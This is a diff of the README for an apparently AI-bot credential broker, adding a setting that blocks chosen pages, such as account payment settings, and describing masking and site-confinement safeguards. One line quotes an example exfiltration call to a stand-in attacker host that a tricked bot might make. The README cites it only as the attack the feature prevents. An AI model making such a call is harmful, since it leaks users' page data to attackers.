@@ -283,7 +283,8 @@ files you're happy to send to xAI/Cursor.
   site another signed in to.
 - A **new bot can use nothing** until you grant it logins, unlock actions, keys, devices and email
   codes with **Access…** in the wizard (or `passbroker api bot-access NAME` with JSON on stdin:
-  `logins`, `unlock`, `keys`, `devices`, `email_codes`, `personal_details`, `sites_limited`, `sites`).
+  `logins`, `unlock`, `keys`, `devices`, `email_codes`, `personal_details`, `sites_limited`, `sites`,
+  `blocked_pages`).
   Bots only see what they're granted.
 - **Personal details are masked** in everything a bot reads from pages: emails, phone, card and
   bank numbers become `[email]`, `[phone]`, `[card number]`, `[bank account]`, and are blacked out
@@ -294,6 +295,11 @@ files you're happy to send to xAI/Cursor.
   granted logins' sites, subdomains included. Pages it opens, links it clicks, popups and redirects
   all stay inside, so a tricked bot can't send page data out through
   `open_url("https://attacker.example/?d=...")`. Off by default.
+- **Pages it may never see** (Access…) blocks chosen pages on sites a bot may otherwise use, such
+  as `amazon.co.uk/gp/your-account/payments` or `paypal.com/myaccount/settings*`: a site, then the
+  start of the page's address, with `*` matching anything (a site alone blocks all of it). A blocked
+  page doesn't load and the tab stays where it was. Sites that switch pages without loading one are
+  caught on the bot's next look, and the tab goes back. Nothing is ever filled into a blocked page.
 - `end_session` signs a bot's browser out when its task is done.
 - Bots pass a `reason`, which is shown in your approval.
 - The typing tool refuses password and code fields, and any text containing a known secret.
